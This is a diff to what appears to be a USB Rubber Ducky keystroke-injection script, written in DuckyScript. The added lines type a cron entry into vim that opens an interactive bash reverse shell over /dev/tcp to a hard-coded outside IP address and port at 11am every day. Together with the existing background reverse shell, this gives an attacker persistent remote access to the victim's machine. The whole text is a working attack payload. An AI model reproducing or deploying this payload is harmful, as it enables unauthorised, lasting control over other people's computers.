@@ -18,8 +18,30 @@ STRING bash
 
 ENTER
 
-
+REM enable background jobs
 STRING set -m
+ENTER
+
+REM add reverse shell to cron
+
+STRING export EDITOR=vim 
+ENTER
+
+STRING crontab -e
+ENTER
+
+STRING g
+ENTER
+
+STRING $
+ENTER
+
+REM set the reverse shell to occur 11am every day
+STRING 0 11 * * * /bin/sh -c "/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" && exit
+ENTER
+
+REM Exit vim
+STRING :wq
 ENTER
 
 REM spawns a reverse shell in background
